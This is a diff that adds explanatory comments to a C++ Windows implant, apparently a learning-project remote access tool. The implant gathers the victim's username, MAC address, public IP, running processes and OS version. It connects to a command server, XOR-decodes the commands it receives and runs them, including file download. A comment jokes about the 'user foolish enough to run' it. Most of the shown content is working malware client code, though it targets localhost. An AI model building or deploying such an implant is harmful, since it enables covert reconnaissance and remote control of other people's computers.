@@ -46,75 +46,78 @@ using namespace std;
 // used to encrypt/decrypt data
 char* xor_func(char msg[]) {
 	for (int i = 0; i < strlen(msg); i++) {
-		msg[i] ^= '+';
+		msg[i] ^= '+'; // XOR each character with '+'
 	}
-	return msg;
+	return msg; // return XORd character array
 }
 
 // get the username of the user foolish enough to run this godforsaken program
 std::string getUsername() {
-	DWORD bufferSize = 0;
-	GetUserNameA(NULL, &bufferSize);
+	DWORD bufferSize = 0; // initialize var bufferSize
+	GetUserNameA(NULL, &bufferSize); // GetUserNameA function w/ NULL buffer to get buffer size
 	if (bufferSize == 0) {
 		return ""; // If username space is 0 return emptystring
 	}
-	char* buffer = new char[bufferSize];
-	if (GetUserNameA(buffer, &bufferSize)) {
-		std::string username(buffer);
-		delete[] buffer;
-		return username;
+	char* buffer = new char[bufferSize]; //allocate mem for buffer
+	if (GetUserNameA(buffer, &bufferSize)) { // If GetUserNameA call is successful...
+		std::string username(buffer); // create string from the buffer
+		delete[] buffer; // free mem
+		return username; // return username as string
 	}
-	delete[] buffer;
+	delete[] buffer; // free mem
 	return "";
 }
 
 std::string getMACs() {
-	std::string mac;
-	ULONG size = 0;
+	std::string mac; // initialize var mac for mac addr
+	ULONG size = 0; // initialize size for buffer
 
 	// Get the network adapter information
 	if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &size) != ERROR_BUFFER_OVERFLOW) {
 		return ""; // if buffer overflow: ret blank
 	}
+	// Allocate mem for adapter addresses buffer
 	PIP_ADAPTER_ADDRESSES adapterAddresses = (PIP_ADAPTER_ADDRESSES)malloc(size);
 	if (adapterAddresses == NULL) {
 		return ""; // if not adapter addresses: ret blank
 	}
+	// Get the network adapter information but w/ the buffer
 	if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapterAddresses, &size) != NO_ERROR) {
 		free(adapterAddresses);
-		return ""; // if errors: ret blank
+		return ""; // if errors occur: ret blank
 	}
 
 	// Iterate over the network adapters and find the MAC address
 	PIP_ADAPTER_ADDRESSES adapter = adapterAddresses;
 	while (adapter != NULL) {
 		if (adapter->PhysicalAddressLength > 0) {
-			char macBuff[18];
+			char macBuff[18]; // Initialize macBuffer to hold the formatted MAC addr
 			// format mac into string
 			sprintf_s(macBuff, sizeof(macBuff), "%02X:%02X:%02X:%02X:%02X:%02X",
 				adapter->PhysicalAddress[0], adapter->PhysicalAddress[1], adapter->PhysicalAddress[2],
 				adapter->PhysicalAddress[3], adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
 			mac = macBuff;
-			break;
+			break; //exit loop after getting mac
 		}
-		adapter = adapter->Next;
+		adapter = adapter->Next; // go to next adapter
 	}
 
-	// Clean up, Clean Up, Everybody Do your share!
+	// Clean up, Clean Up, Everybody Do your share! free mem
 	free(adapterAddresses);
 	return mac;
 }
 
 // Helper function for getPublicIP()
 std::string get_response_string(HANDLE hReq) {
-	BOOL reqSuccess = HttpSendRequestA(hReq, NULL, NULL, NULL, NULL);
-	if (reqSuccess) {
+	BOOL reqSuccess = HttpSendRequestA(hReq, NULL, NULL, NULL, NULL); // Send an HTTP req and store the success status
+	if (reqSuccess) { // if HTTP req successful...
 		// Initialize variables for internetReadFile
 		DWORD recvData = 0;
-		DWORD chunkSize = 2048;
+		DWORD chunkSize = 2048; //set buffer size for reading data in chunks
 		std::string buf;
 		std::string chunk(chunkSize, 0);
 		while (InternetReadFile(hReq, &chunk[0], chunkSize, &recvData) && recvData) {
+			// Read data from the HTTP resp into the chunk buffer, and store the number of bytes read in recvData
 			chunk.resize(recvData);
 			buf += chunk;
 		}
@@ -139,10 +142,10 @@ std::string getPublicIP() {
 	if (hConn) { // If hConnect is successful: teardown
 		InternetCloseHandle(hConn);
 	}
-	return resp;
+	return resp; // If req failed, return null pointer
 }
 
-
+// get a printed out list of all running processes
 std::string GetProcessList()
 {
 	std::string processList;
@@ -197,6 +200,8 @@ std::string GetProcessList()
 // get the windows os version
 std::string getWinVer() {
 	// Deprecated but it still works lol
+
+	// Initialize OSVERSIONINFOEX struct
 	OSVERSIONINFOEX osvi;
 	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
@@ -385,6 +390,8 @@ void handle_download(int sock, const char* filename) {
 	CloseHandle(fhandle);*/
 }
 
+// checks if user input is correct
+// returns an int specific to case number in main()
 int parseCmd(char cmd[]) {
 	if (strstr(cmd, "end") != NULL) {
 		return -1;
@@ -407,34 +414,37 @@ int parseCmd(char cmd[]) {
 }
 
 SOCKET getConnected() {
-	WSADATA wsaData;
-	SOCKET sock = INVALID_SOCKET;
+	WSADATA wsaData; // windows socket data struct
+	SOCKET sock = INVALID_SOCKET; // socket handle
+
 	//struct sockaddr_in address;
 	//struct sockaddr_in server;
-	struct addrinfo* result = NULL;
-	struct addrinfo hints;
 
-	char recvbuf[DEFAULT_BUFLEN];
-	int revcbuflen = DEFAULT_BUFLEN;
-	int connResult;
+	struct addrinfo* result = NULL; // Pointer to addrinfo struct
+	struct addrinfo hints; // addrinfo struct for hints
 
-	connResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	char recvbuf[DEFAULT_BUFLEN]; // rcv buffer for incoming data
+	int revcbuflen = DEFAULT_BUFLEN; // lenght of rcv bubber
+	int connResult; // connection result
+
+	connResult = WSAStartup(MAKEWORD(2, 2), &wsaData); // initialize winsoc
 	if (connResult != 0) {
 		printf("WSAStartup failed with error: %d\n", connResult);
 		return 1;
 	}
 
-	ZeroMemory(&hints, sizeof(hints));
+	ZeroMemory(&hints, sizeof(hints)); // zero out hint struct
 	hints.ai_family = AF_UNSPEC; // Use AF_UNSPEC bcs localhost
 	hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
 	hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
-	hints.ai_flags = AI_PASSIVE;
+	hints.ai_flags = AI_PASSIVE; // AI_PASSIVE flag indicates that the returned
+								 // address is intended for use in bind() or listen() functions
 
 	// resolve server address and port
 	connResult = getaddrinfo("localhost", SERV_PORT, &hints, &result);
 	if (connResult != 0) {
 		printf("getaddrinfo failed: %d\n", connResult);
-		WSACleanup();
+		WSACleanup(); // cleanup winsoc
 		return 1;
 	}
 
@@ -444,7 +454,7 @@ SOCKET getConnected() {
 		// Create a SOCKET for connecting to server
 		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 
-		if (sock == INVALID_SOCKET) {
+		if (sock == INVALID_SOCKET) { // error handling
 			printf("socket failed with error: %ld\n", WSAGetLastError());
 			WSACleanup();
 			return 1;
@@ -461,15 +471,15 @@ SOCKET getConnected() {
 		break; //got a connection, or none worked
 	}
 
-	freeaddrinfo(result);
+	freeaddrinfo(result); // free mem
 
-	if (sock == INVALID_SOCKET) {
+	if (sock == INVALID_SOCKET) { 
 		printf("Unable to connect to server!\n");
 		WSACleanup();
 		return 1;
 	}
 
-	return sock;
+	return sock; // Return the connected socket handle
 }
 
 void sendMsg(std::string data, SOCKET sock) {
@@ -507,23 +517,23 @@ void sendMsg(std::string data, SOCKET sock) {
 }
 
 int main() {
-	string filepath;
-	int cmd;
-	int command_packet_len;
-	char buf[DEFAULT_BUFLEN];
-	char recvbuf[DEFAULT_BUFLEN];
-	SOCKET sock;
-	sock = getConnected();
+	string filepath;				// var for filepath
+	int cmd;						// var for command from server
+	int command_packet_len;			// var for length of command packet
+	char buf[DEFAULT_BUFLEN];		// var for character buffer to send data to the server
+	char recvbuf[DEFAULT_BUFLEN];	// var for character buffer to rcv data to the server
+	SOCKET sock;					// socket var
+	sock = getConnected();			// call getConnected() function to establish connection
 
 	printf("Connection to server successful! It's a miracle!!\n");
 
 	while (true) {
-		std::string data;
-		std::wstring data2;
-		int offset = 0;
-		int getcmd;
-		memset(buf, 0, DEFAULT_BUFLEN);
-		memset(recvbuf, 0, DEFAULT_BUFLEN);
+		std::string data;					// hold info in string form
+		std::wstring data2;					// hold info in wstring form
+		int offset = 0;						// hold offset for parsing data
+		int getcmd;							// hold result of command from server
+		memset(buf, 0, DEFAULT_BUFLEN);		// clear buffer
+		memset(recvbuf, 0, DEFAULT_BUFLEN); // clear rcv buffer
 		getcmd = recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock
 		/*
 		recv(sock, (char *)&command_packet_len, 4, 0);
@@ -534,11 +544,11 @@ int main() {
 		*/
 
 		printf("enc: %s ", recvbuf); // debug
-		int cmd = parseCmd(xor_func(recvbuf));
+		int cmd = parseCmd(xor_func(recvbuf)); // call parseCmd() function to parse the received command after applying xor_func() to it
 		printf("dec: %s ", recvbuf); // debug
 		printf("cmd int: %d \n", cmd); // debug
 
-		switch (cmd) {
+		switch (cmd) { //switch cases for each respecticve command sent from the server
 		case -1: { //end
 			printf("Shutting down\n"); //debug
 			shutdown(sock, 2);
